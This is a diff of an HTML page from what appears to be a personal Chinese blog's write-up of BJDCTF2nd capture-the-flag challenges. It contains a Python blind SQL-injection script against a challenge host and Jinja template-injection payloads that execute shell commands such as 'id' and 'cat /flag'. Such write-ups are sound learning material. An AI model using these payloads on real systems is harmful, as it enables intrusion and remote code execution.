@@ -8,23 +8,25 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>BJDCTF2nd | Xun9er&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="新手赛，看来我不是一个合格的新手。">
+  <meta name="description" content="新手赛，看来我不是一个合格的新手。记录一下，不然会忘。">
 <meta name="keywords" content="随笔,ctf,sqli">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BJDCTF2nd">
 <meta property="og:url" content="http://yoursite.com/2020/03/25/BJDCTF2nd/index.html">
 <meta property="og:site_name" content="Xun9er&#39;s blog">
-<meta property="og:description" content="新手赛，看来我不是一个合格的新手。">
+<meta property="og:description" content="新手赛，看来我不是一个合格的新手。记录一下，不然会忘。">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.loli.net/2020/03/25/v6znuLWyc3Bm2Nj.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/25/PvNYdcqfLxoh9SB.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/25/QnZT3aHcMX1SKWt.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/25/5YMSP1hZqxFutsb.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/25/FAMSKQ35qgBewYN.png">
-<meta property="og:updated_time" content="2020-03-25T09:27:18.567Z">
+<meta property="og:image" content="https://i.loli.net/2020/03/26/SGjK5NecyO8tLoV.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/26/E6xcsnT3vLO4heA.png">
+<meta property="og:updated_time" content="2020-03-26T01:53:40.149Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BJDCTF2nd">
-<meta name="twitter:description" content="新手赛，看来我不是一个合格的新手。">
+<meta name="twitter:description" content="新手赛，看来我不是一个合格的新手。记录一下，不然会忘。">
 <meta name="twitter:image" content="https://i.loli.net/2020/03/25/v6znuLWyc3Bm2Nj.png">
   
     <link rel="alternative" href="/atom.xml" title="Xun9er&#39;s blog" type="application/atom+xml">
@@ -198,7 +200,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">451字</span>
+        <span class="post-count">846字</span>
       </span>
     </span>
 
@@ -207,7 +209,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">2分</span>
+        <span class="post-count">4分</span>
       </span>
     </span>
 </div>
@@ -218,7 +220,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>新手赛，看来我不是一个合格的新手。  </p>
+        <p>新手赛，看来我不是一个合格的新手。记录一下，不然会忘。  </p>
 <a id="more"></a>
 <h1 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h1><h2 id="burp-fuzz"><a href="#burp-fuzz" class="headerlink" title="burp fuzz"></a>burp fuzz</h2><p>学到了，，俺再也不要手工测过滤了QAQ。<a href="https://segmentfault.com/a/1190000018748071" target="_blank" rel="noopener">利用 Burpsuite Fuzz 实现 SQL 注入</a><br><img src="https://i.loli.net/2020/03/25/v6znuLWyc3Bm2Nj.png" alt="sqli 3.png"><br><img src="https://i.loli.net/2020/03/25/PvNYdcqfLxoh9SB.png" alt="sqli 4.png">  </p>
 <h2 id="robots-txt提示"><a href="#robots-txt提示" class="headerlink" title="robots.txt提示"></a>robots.txt提示</h2><p>提示有hint.txt<br>访问如下：</p>
@@ -235,6 +237,21 @@ select * from users where username='$_POST["username"]' and password='$_POST["pa
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://bad6a7d7-7c67-4b08-8083-fbda7d88b93e.node3.buuoj.cn&quot;</span><br><span class="line"></span><br><span class="line">flag=&apos;&apos;#定义一个空字符串</span><br><span class="line"></span><br><span class="line">for i in range(1,20):	</span><br><span class="line">	low=32</span><br><span class="line">	high=126</span><br><span class="line">	mid=(low+high)//2## 二分法</span><br><span class="line">	while high&gt;low:</span><br><span class="line">		</span><br><span class="line">		#payload=&apos;or ascii(substr((database()),&#123;&#125;,1))&gt;&#123;&#125;#&apos;.format(i,mid)</span><br><span class="line">		payload=&apos;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;#&apos;.format(i,mid)</span><br><span class="line">		data=&#123;</span><br><span class="line">			&apos;username&apos;:&apos;admin \\&apos;,</span><br><span class="line">			&apos;password&apos;:payload</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		r=requests.post(url,data=data)	</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">		if &apos;stronger&apos; in r.text:</span><br><span class="line">			low = mid+1</span><br><span class="line">			mid=(low+high)//2</span><br><span class="line">		else:</span><br><span class="line">			high=mid	</span><br><span class="line">			mid=(low+high)//2</span><br><span class="line">	flag+=chr(mid)#将ascii值转为字符</span><br><span class="line">	print(flag)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
 
 <p>ps：这里直接爆password就可以了，不用头铁去爆库爆表。。。database查出来了，但表名就查不了，至少我没查出来。<br><img src="https://i.loli.net/2020/03/25/5YMSP1hZqxFutsb.png" alt="bjd sql1.png"><br>得到密码，登录。<br><img src="https://i.loli.net/2020/03/25/FAMSKQ35qgBewYN.png" alt="bjd sql2.png">  </p>
+<h1 id="duang-shell"><a href="#duang-shell" class="headerlink" title="duang_shell"></a>duang_shell</h1><p>大概就是要用两个账号，一个开linux内网靶机，一个开本题。因为不能访问外网，题目有写。<br>先连接得题目服务器IP，然后反弹shell。<br>没有做过这种题，照着1fonly师傅的wp搞了好久，现在真的不想再做一遍了，下次一定，下次一定。  </p>
+<h1 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h1><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>拿着白嫖来的扫描器。发现git泄露。<br>再用GitHack down下来。得到：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&apos;yds_is_so_beautiful&apos;];</span><br><span class="line">echo unserialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>看样子要用序列化，但这里并没有可以拿来用的类，所以用php原生类xss。  </p>
+<p><img src="https://i.loli.net/2020/03/26/SGjK5NecyO8tLoV.png" alt="xss light.png">  </p>
+<p>再把得到的get传参，flag在cookie。  </p>
+<h2 id="php原生类"><a href="#php原生类" class="headerlink" title="php原生类"></a>php原生类</h2><p><a href="https://blog.csdn.net/qq_33020901/article/details/79605355" target="_blank" rel="noopener">反序列化之PHP原生类的利用</a>  </p>
+<h1 id="feak-google"><a href="#feak-google" class="headerlink" title="feak google"></a>feak google</h1><p>提示很明确了，是jinja的ssti。<br>读取文件：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;&#123;%%20if%20c.__name__%20==%20%27catch_warnings%27%20%&#125;&#123;%%20for%20b%20in%20c.__init__.__globals__.values()%20%&#125;&#123;%%20if%20b.__class__%20==%20&#123;&#125;.__class__%20%&#125;&#123;%%20if%20%27eval%27%20in%20b.keys()%20%&#125;&#123;&#123;%20b[%27eval%27](%27__import__(%22os%22).popen(%22id%22).read()%27)%20&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到：<br><img src="https://i.loli.net/2020/03/26/E6xcsnT3vLO4heA.png" alt="feak google.png"><br>查找flag：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;&#123;%%20if%20c.__name__%20==%20%27catch_warnings%27%20%&#125;&#123;%%20for%20b%20in%20c.__init__.__globals__.values()%20%&#125;&#123;%%20if%20b.__class__%20==%20&#123;&#125;.__class__%20%&#125;&#123;%%20if%20%27eval%27%20in%20b.keys()%20%&#125;&#123;&#123;%20b[%27eval%27](%27__import__(%22os%22).popen(%22cat%20/flag%22).read()%27)%20&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/u011377996/article/details/86776181" target="_blank" rel="noopener">SSTI模板注入</a><br><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">一些payload</a>  </p>
 
       
 
@@ -347,6 +364,15 @@ select * from users where username='$_POST["username"]' and password='$_POST["pa
   
 <nav id="article-nav">
   
+    <a href="/2020/03/26/notes-on-sqli-labs/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          notes on sqli-labs
+        
+      </div>
+    </a>
+  
   
     <a href="/2020/03/22/notes-on-checkio/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">notes on checkio</div>
@@ -376,7 +402,7 @@ select * from users where username='$_POST["username"]' and password='$_POST["pa
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单注入"><span class="toc-number">1.</span> <span class="toc-text">简单注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#burp-fuzz"><span class="toc-number">1.1.</span> <span class="toc-text">burp fuzz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#robots-txt提示"><span class="toc-number">1.2.</span> <span class="toc-text">robots.txt提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-number">1.3.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本"><span class="toc-number">1.4.</span> <span class="toc-text">脚本</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单注入"><span class="toc-number">1.</span> <span class="toc-text">简单注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#burp-fuzz"><span class="toc-number">1.1.</span> <span class="toc-text">burp fuzz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#robots-txt提示"><span class="toc-number">1.2.</span> <span class="toc-text">robots.txt提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-number">1.3.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本"><span class="toc-number">1.4.</span> <span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#duang-shell"><span class="toc-number">2.</span> <span class="toc-text">duang_shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS之光"><span class="toc-number">3.</span> <span class="toc-text">XSS之光</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#目录扫描"><span class="toc-number">3.1.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php原生类"><span class="toc-number">3.2.</span> <span class="toc-text">php原生类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#feak-google"><span class="toc-number">4.</span> <span class="toc-text">feak google</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -488,23 +514,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">sqli</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">php</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -525,6 +543,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">sqli</a>
               </li>
             
             <div class="clearfix"></div>
